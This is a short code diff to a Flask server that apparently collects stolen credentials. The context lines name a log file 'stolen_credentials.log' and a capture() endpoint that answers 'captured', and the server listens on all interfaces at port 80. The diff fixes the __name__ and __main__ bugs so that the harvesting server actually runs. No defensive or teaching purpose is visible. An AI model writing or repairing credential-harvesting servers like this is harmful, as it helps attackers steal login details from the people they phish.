@@ -1,6 +1,6 @@
 from flask import Flask, request, jsonify, render_template_string
 
-app = Flask(name)
+app = Flask(__name__)
 
 RECEIVE_FILE = "stolen_credentials.log"
 
@@ -80,5 +80,5 @@ def capture():
     
     return jsonify({"status": "captured"})
 
-if name == 'main':
+if __name__ == '__main__':
     app.run(host='0.0.0.0', port=80, debug=False)
